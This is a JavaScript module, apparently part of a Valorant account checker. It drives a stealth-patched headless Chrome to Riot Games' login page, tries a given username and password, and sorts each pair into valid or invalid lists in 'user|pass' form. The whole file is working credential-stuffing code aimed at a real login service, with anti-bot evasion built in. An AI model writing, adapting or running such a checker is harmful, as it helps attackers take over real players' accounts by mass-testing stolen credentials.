const puppeteer = require("puppeteer-extra")
const StealthPlugin = require("puppeteer-extra-plugin-stealth")
const util = require("./util")

puppeteer.use(StealthPlugin())

module.exports = (user, pass, valide, pasvalide) => {

    puppeteer.launch({
        headless: false,
        executablePath: "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" , args: ["--window-position=0,0"]
    }).then(async browser => {

        var url = "https://auth.riotgames.com/login#client_id=play-valorant-web-prod&nonce=ODAsMTc2LDY2LDEy&prompt=login&redirect_uri=https%3A%2F%2Fbeta.playvalorant.com%2Fopt_in&response_type=token%20id_token&scope=account%20openid&state=bG9naW4%3D&ui_locales=fr-fr";


        const page = (await browser.pages())[0];

        console.log("Navigation vers la page : riotgames.com");
        await page.goto(url)

        console.log("User")
        await page.waitForSelector("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > div.grid.grid-align-center.grid-justify-space-between.grid-fill.grid-direction__column.grid-panel-web__content.grid-panel__content > div > div > div > div:nth-child(1) > div > input", { timeout: 30000 });
        await page.type("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > div.grid.grid-align-center.grid-justify-space-between.grid-fill.grid-direction__column.grid-panel-web__content.grid-panel__content > div > div > div > div:nth-child(1) > div > input", user);


        console.log("Pass")
        await page.waitForSelector("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > div.grid.grid-align-center.grid-justify-space-between.grid-fill.grid-direction__column.grid-panel-web__content.grid-panel__content > div > div > div > div.field.password-field.field--animate > div > input", { timeout: 30000 });
        await page.type("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > div.grid.grid-align-center.grid-justify-space-between.grid-fill.grid-direction__column.grid-panel-web__content.grid-panel__content > div > div > div > div.field.password-field.field--animate > div > input", pass);

       console.log("Connexion...")
        await page.waitForSelector("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > button", { timeout: 30000 });
        await page.click("body > div > div > div > div.grid.grid-direction__row.grid-page-web__content > div.grid.grid-direction__column.grid-page-web__wrapper > div > button");

        console.log("Attente...")
        await page.waitFor(7500);
        console.log("OK")
        if (await page.url() === "https://beta.playvalorant.com/fr-fr/")
        {
            valide(user + "|" + pass);
            console.log("Compte valide")
            await page.waitFor(2500)
            await browser.close();
        }
        else
        {
            pasvalide(user + "|" + pass);
            console.log("Compte Invalide")
            await page.waitFor(2500)
            await browser.close();
        }
    })
}